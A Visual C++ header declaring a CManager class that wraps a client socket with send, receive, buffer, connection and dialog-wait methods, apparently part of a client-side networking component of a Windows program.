// Manager.h: interface for the CManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MANAGER_H__5935556F_19FF_4676_898A_3D750F2F2658__INCLUDED_)
#define AFX_MANAGER_H__5935556F_19FF_4676_898A_3D750F2F2658__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <winsock2.h>
#include "../ClientSocket.h"
#include "macros.h"
#include "until.h"

#ifdef _CONSOLE
#include <stdio.h>
#endif

class CManager  
{
	friend class CClientSocket;
	typedef int (*SENDPROC)(LPBYTE lpData, UINT nSize);

public:
	CManager(CClientSocket *pClient);
	virtual ~CManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
//	virtual char* ReturnPath();
	int Send(LPBYTE lpData, UINT nSize);
	CClientSocket	*m_pClient;
	PBYTE GetBuffer(UINT nPos = 0);
	BOOL IsConnect();
	void Disconnect();

	HANDLE		m_hEventDlgOpen;
	char strWinPath[MAX_PATH];
	void WaitForDialogOpen();
	void NotifyDialogIsOpen();
private:
	SENDPROC	m_pSendProc;
};

#endif // !defined(AFX_MANAGER_H__5935556F_19FF_4676_898A_3D750F2F2658__INCLUDED_)
